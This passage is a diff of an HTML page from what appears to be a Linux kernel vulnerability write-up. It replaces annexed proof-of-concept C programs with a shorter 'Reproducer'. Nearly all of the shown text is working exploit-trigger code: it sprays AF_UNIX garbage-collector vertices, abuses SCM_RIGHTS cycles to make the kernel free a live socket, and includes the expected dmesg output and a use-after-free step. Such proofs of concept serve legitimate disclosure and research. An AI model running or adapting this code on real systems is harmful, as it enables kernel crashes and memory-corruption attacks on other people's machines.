-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setsockopt</span>(skA, SOL_SOCKET, SO_RCVBUF, <span style="color:#f92672">&amp;</span>big, <span style="color:#66d9ef">sizeof</span>(big));
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> sender <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_UNIX, SOCK_DGRAM, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sender <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;victim sender&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> VICTIM_PIPES; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> p[<span style="color:#ae81ff">2</span>];
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(p) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>);
-</span></span><span style="display:flex;"><span>            pipe_write[i] <span style="color:#f92672">=</span> p[<span style="color:#ae81ff">1</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> ctl[<span style="color:#a6e22e">CMSG_SPACE</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>))] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;x&#39;</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">struct</span> iovec iov <span style="color:#f92672">=</span> { .iov_base <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>data, .iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> };
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">struct</span> msghdr msg <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>                .msg_name <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aAddr, .msg_namelen <span style="color:#f92672">=</span> aLen,
-</span></span><span style="display:flex;"><span>                .msg_iov <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>iov, .msg_iovlen <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
-</span></span><span style="display:flex;"><span>                .msg_control <span style="color:#f92672">=</span> ctl, .msg_controllen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(ctl),
-</span></span><span style="display:flex;"><span>            };
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>cmsg <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_FIRSTHDR</span>(<span style="color:#f92672">&amp;</span>msg);
-</span></span><span style="display:flex;"><span>            cmsg<span style="color:#f92672">-&gt;</span>cmsg_level <span style="color:#f92672">=</span> SOL_SOCKET;
-</span></span><span style="display:flex;"><span>            cmsg<span style="color:#f92672">-&gt;</span>cmsg_type  <span style="color:#f92672">=</span> SCM_RIGHTS;
-</span></span><span style="display:flex;"><span>            cmsg<span style="color:#f92672">-&gt;</span>cmsg_len   <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_LEN</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>));
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>(<span style="color:#a6e22e">CMSG_DATA</span>(cmsg), <span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">0</span>], <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>));
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ssize_t</span> r <span style="color:#f92672">=</span> <span style="color:#a6e22e">sendmsg</span>(sender, <span style="color:#f92672">&amp;</span>msg, MSG_DONTWAIT);
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">close</span>(p[<span style="color:#ae81ff">0</span>]);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (r <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">close</span>(pipe_write[i]);
-</span></span><span style="display:flex;"><span>                pipe_write[i] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (errno <span style="color:#f92672">==</span> EAGAIN) <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;plant victim&#34;</span>);
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>            n_planted<span style="color:#f92672">++</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(sender);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* 2-a: sk-A → embryo sk-B.  Pre-accept send hits the embryo&#39;s queue;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * unix_edge_successor() redirects the edge to listener-&gt;vertex. */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">send_fd</span>(client_to_B, skA, NULL, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;send_fd(A→B embryo)&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* 2-b: sk-X → sk-X — keeps unix_graph_maybe_cyclic = true. */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_un xAddr; <span style="color:#66d9ef">socklen_t</span> xLen;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> skX <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>xAddr, <span style="color:#f92672">&amp;</span>xLen);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">send_fd</span>(skX, skX, <span style="color:#f92672">&amp;</span>xAddr, xLen) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;send_fd(X→X)&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* 2-c: slow walk labels sk-A=2, sk-X=3, sets unix_graph_grouped=true. */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kick_gc</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* ========== Stage 3: accept ; sk-B → sk-C ; close sk-A ; fast GC ======= */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[*] stage 3: accept(sk-B), sk-B→sk-C, close sk-A, GC&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> skB <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(listener, NULL, NULL);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (skB <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;accept&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* 3-b: sk-B → sk-C.  unix_add_edge() allocates a fresh unix_vertex for
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * sk-B (first time sk-B is a predecessor).  Stale scc_index = 2.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * sk-C is not inflight, so unix_update_graph(successor=sk-C) is a no-op
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * and unix_graph_grouped stays true.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     *
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * sk-B is an accepted SOCK_STREAM — sendmsg() with msg_name returns
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * EISCONN.  Route via a throwaway DGRAM carrier; sk-B rides as the
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * SCM_RIGHTS payload, so it becomes the predecessor regardless. */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_un cAddr; <span style="color:#66d9ef">socklen_t</span> cLen;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> skC <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>cAddr, <span style="color:#f92672">&amp;</span>cLen);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> carrier <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_UNIX, SOCK_DGRAM, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (carrier <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;carrier&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">send_fd</span>(carrier, skB, <span style="color:#f92672">&amp;</span>cAddr, cLen) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;send_fd(B→C)&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(carrier);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* 3-c: close sk-A → file_count: 2→1 == out_degree. */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(skA);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(client_to_B);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* 3-d: fast-path GC.  scc_index match (both 2) + total_ref==out_degree
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * → sk-A declared dead → sk-A&#39;s queue spliced + purged. */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kick_gc</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Oracle: every planted pipe_read was fput() to zero by the bad purge,
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * so write(pipe_write[i]) reports EPIPE. */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> epipes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, ok <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> n_planted; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (pipe_write[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">continue</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">ssize_t</span> n <span style="color:#f92672">=</span> <span style="color:#a6e22e">write</span>(pipe_write[i], <span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> errno <span style="color:#f92672">==</span> EPIPE) epipes<span style="color:#f92672">++</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)             ok<span style="color:#f92672">++</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[=] pipe write results: %d EPIPE / %d OK (of %d planted)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>           epipes, ok, n_planted);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (epipes <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] BUG TRIGGERED: sk-A&#39;s queue was purged while still live&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[-] bug did not fire — check dmesg for kernel printks&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> n_planted; i<span style="color:#f92672">++</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (pipe_write[i] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">close</span>(pipe_write[i]);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> recovered_A <span style="color:#f92672">=</span> <span style="color:#a6e22e">recv_fd</span>(skB);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (recovered_A <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">close</span>(recovered_A);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(skB); <span style="color:#a6e22e">close</span>(skC); <span style="color:#a6e22e">close</span>(skX); <span style="color:#a6e22e">close</span>(listener);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h3 id="expected-output-on-a-vulnerable-kernel">Expected output on a vulnerable kernel</h3>
-<p>User-space:</p>
-<pre tabindex="0"><code>[*] stage 1: spray vertices (scc_index=2) via ring + GC
-[*] stage 2: sk-A→embryo(sk-B), sk-X→sk-X, GC
-[*] stage 3: accept(sk-B), sk-B→sk-C, close sk-A, GC
-[=] pipe write results: 11 EPIPE / 0 OK (of 11 planted)
-[+] BUG TRIGGERED: sk-A&#39;s queue was purged while still live
-</code></pre><p><code>dmesg</code>:</p>
-<pre tabindex="0"><code>GC Slow
-Vertex 0, SCC -&gt; 2
-Vertex 0, SCC -&gt; 3
-...
-GC Fast
-total_ref: 1, out_degree: 1
-vertex dead: True
-[+] SCC DEAD Confirmed
-sk gets destroyed
-sk gets destroyed
-...
-</code></pre><p>Every <code>EPIPE</code> in user-space is a pipe file that was <code>fput()</code>&rsquo;d because the GC mistakenly declared a live socket dead. Every <code>sk gets destroyed</code> line inside the purge window is a <code>unix_sock</code> that was freed for the same wrong reason. Together they are the kernel-observable and user-observable signature of the <code>scc_index</code> uninitialised-field bug.</p>
-<hr>
-<h2 id="annex-2--alternate-poc-b--a--c--d">Annex 2 — alternate PoC (<code>B ↔ A → C → D</code>)</h2>
-<p>The listing below is the simpler variant described in the <em>My own strategy</em> subsection. It drops the stream listener / accept / embryo entirely and relies on a two-socket cycle <code>B ↔ A</code> to flip <code>unix_graph_grouped</code> (and keep <code>unix_graph_maybe_cyclic</code> true because the cycle itself is a cycle). Stage 3 chains <code>A → C → D</code> on fresh vertices, closes both <code>skA</code> and <code>skB</code>, and then pulls <code>skA</code> back out of <code>skC</code>&rsquo;s receive queue with <code>recv_fd()</code> to exercise the dangling reference.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: GPL-2.0
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * AF_UNIX GC UAF repro — simplified three-stage scenario.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Root cause: unix_add_edge() does not initialise vertex-&gt;scc_index.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Any vertex freshly popped from the vertex slab inherits whatever
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * scc_index the previous owner wrote — stage 1 sprays freed vertices
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * all tagged with UNIX_VERTEX_INDEX_START (== 2).
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Stages:
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *   1) heap-spray many vertices with scc_index=2, close, GC
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *        (ring of N_CYCLE DGRAM sockets → single SCC, index 2)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *   2) B &lt;-&gt; A; GC
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *        (flips unix_graph_grouped=true and
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *         unix_graph_maybe_cyclic=true; the two vertices are
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *         freed with scc_index=2 on top of the sprayed slab)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *   3) sk-A -&gt; sk-C (vertex alloc, stale scc_index=2)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *      sk-C -&gt; sk-D (vertex alloc, stale scc_index=2)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *      close sk-A; close sk-B
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *      GC → unix_walk_scc_fast() → sk-A wrongly declared dead → free
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *   4) recv_fd(skC) pulls sk-A out; write() on the recovered fd
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *      touches freed state → UAF.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * build: gcc -O2 -Wall -o poc_unix_gc_repro poc_unix_gc_repro.c
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
+</code></pre><p><strong>Reproducer</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stddef.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
@@ -994,6 +541,10 @@ sk gets destroyed
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SPRAY_ROUNDS    1   </span><span style="color:#75715e">/* rounds × N_CYCLE vertices sprayed   */</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">die</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s) { <span style="color:#a6e22e">perror</span>(s); <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>); }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * build: gcc -O2 -Wall -o poc_unix_gc_repro poc_unix_gc_repro.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">send_fd</span>(<span style="color:#66d9ef">int</span> sock, <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> sockaddr_un <span style="color:#f92672">*</span>dst, <span style="color:#66d9ef">socklen_t</span> dstlen)
 </span></span><span style="display:flex;"><span>{
@@ -1080,11 +631,7 @@ sk gets destroyed
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * GC runs from inside unix_release_sock() when unix_tot_inflight &gt; 0.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Build a one-way chain so a *real* close cascade hits the
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * `if (unix_tot_inflight) gc()` site.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#define KICK_ROUNDS 1
 </span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">kick_gc</span>(<span style="color:#66d9ef">void</span>)
 </span></span><span style="display:flex;"><span>{
@@ -1093,19 +640,13 @@ sk gets destroyed
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">socklen_t</span> la, lb;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> s0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>a, <span style="color:#f92672">&amp;</span>la);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> s1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>b, <span style="color:#f92672">&amp;</span>lb);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send_fd</span>(s0, s0, <span style="color:#f92672">&amp;</span>b, lb); <span style="color:#75715e">/* s0&#39;s fd → s1&#39;s queue (one-way) */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(s0);               <span style="color:#75715e">/* s0 refcnt 2→1, kept inflight */</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(s1);               <span style="color:#75715e">/* s1 refcnt 1→0 → release → cascade → GC */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send_fd</span>(s0, s0, <span style="color:#f92672">&amp;</span>b, lb);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(s0);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(s1);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">usleep</span>(<span style="color:#ae81ff">200</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * One spray round: N_CYCLE DGRAM sockets wired into a single ring via
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * msg_namelen. After all local fds are closed every socket has
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * file refcnt==1 (one inflight reference) so the ring survives until
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * GC collects it and tags every vertex with scc_index = 2.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">spray_round</span>(<span style="color:#66d9ef">void</span>)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                <span style="color:#f92672">*</span>socks <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(N_CYCLE, <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>socks));
@@ -1133,17 +674,12 @@ sk gets destroyed
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Stage 1: heap-spray vertices with scc_index == 2 */</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[*] stage 1: spray vertices (scc_index=2) via cycle+GC&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> r <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; r <span style="color:#f92672">&lt;</span> SPRAY_ROUNDS; r<span style="color:#f92672">++</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">spray_round</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">3</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Stage 2: B &lt;-&gt; A ; GC
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * The two-socket cycle flips unix_graph_grouped=true and keeps
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * unix_graph_maybe_cyclic=true. After GC both vertices are freed
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * LIFO on top of the sprayed slab, still carrying scc_index=2. */</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[*] stage 2: B &lt;-&gt; A ; GC&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_un aAddr, bAddr, cAddr, dAddr;
@@ -1155,12 +691,6 @@ sk gets destroyed
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">send_fd</span>(skB, skB, <span style="color:#f92672">&amp;</span>aAddr, aLen) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;send_fd(B-&gt;A)&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kick_gc</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Stage 3: A -&gt; C ; C -&gt; D ; close A ; close B ; GC
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Neither sk-C nor sk-D is inflight at the time of these sends,
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * so unix_update_graph() does not reset grouped/cyclic and the
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * fast path runs on the next GC. sk-A and sk-B&#39;s fresh vertices
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * inherit stale scc_index=2 from the freelist. */</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[*] stage 3: A -&gt; C ; C -&gt; D ; close A ; close B ; GC&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> skC <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>cAddr, <span style="color:#f92672">&amp;</span>cLen);
@@ -1187,13 +717,7 @@ sk gets destroyed
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] done&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h3 id="differences-from-annex-1">Differences from Annex 1</h3>
-<ul>
